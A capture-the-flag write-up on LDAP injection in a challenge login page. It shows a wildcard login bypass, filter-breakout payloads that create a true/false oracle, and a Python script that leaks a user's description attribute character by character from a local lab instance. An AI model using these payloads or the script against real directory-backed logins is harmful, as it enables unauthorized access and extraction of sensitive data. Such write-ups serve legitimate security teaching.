# lightweight

### Enumeration

We are greeted by a simple login page. Trying different special characters reveals that it acts in a different way for these characters: `*`, `(`, `)`.

Parentheses cause a 500 error, and `*` lets us bypass the login - it's what we would expect from LDAP, and definitely not SQL. "Lightweight" could be a hint - LDAP stands for Lightweight Directory Access Protocol.

So by putting `username=*&password=*` we can bypass the auth and see a hint:

```html
User Description: FAILED TO LOAD <!-- Probably for the better, as it might contain sensitive data -->
```

It points to leaking the user's description.

### Leaking the description

We can try to break out of the filter expression which we are injecting into, and add another one. Similar to payloads from [this cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md). We need to guess the correct number of parantheses to close, which in this case is 1. 

```
username=*)(description=bts*&password=*
```

The above request lets us log in (status code 200), however this one:

```
username=*)(description=wrong*&password=*
```

...return a status code 401. We can write a script and leak the description (flag) one character at a time.

```py
import requests

URL = "http://localhost"

def check_description(prefix):
    data = {
        "username": f"*)(description={prefix}*",
        "password": "*"
    }

    r = requests.post(URL, data=data)
    if r.status_code != 200:
        return False
    return True

def leak():
    prefix = ""
    while True:
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-":
            if check_description(prefix + char):
                prefix += char
                print(prefix)
                break
        else:
            break
    return prefix

if __name__ == "__main__":
    prefix = leak()
    print(f"Description: {prefix}")
```
